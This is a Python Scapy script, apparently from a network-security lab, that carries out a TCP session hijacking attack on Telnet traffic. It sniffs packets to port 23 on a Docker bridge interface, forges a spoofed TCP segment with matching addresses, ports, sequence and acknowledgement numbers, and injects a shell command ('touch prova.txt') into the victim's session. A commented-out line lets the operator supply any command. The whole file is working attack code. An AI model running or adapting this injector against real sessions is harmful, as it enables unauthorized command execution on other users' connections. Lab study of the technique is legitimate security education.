from scapy.all import *

#command = ""


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='dst port 23',prn=my_sessionHijacking)

def my_sessionHijacking(pkt):
    pkt.show()
    command = Raw(load="\r\ntouch prova.txt\r\n")
    print("[] command:",command)
    #IP
    ip=IP()
    ip.src=pkt[IP].src
    ip.dst=pkt[IP].dst
    ip.id=pkt[IP].id+1
    #TCP
    tcp=TCP()
    tcp.sport=pkt[TCP].sport
    tcp.dport=pkt[TCP].dport
    tcp.seq=pkt[TCP].seq
    tcp.ack=pkt[TCP].ack
    tcp.flags=0x18#"ACK PSH flag
    command_pkt=ip/tcp
    print("[+] Sending command ...")
    send(command_pkt/command)

 
if __name__=="__main__":
    #command = input("[+] Insert command to launch:")
    my_sniff()
    
    
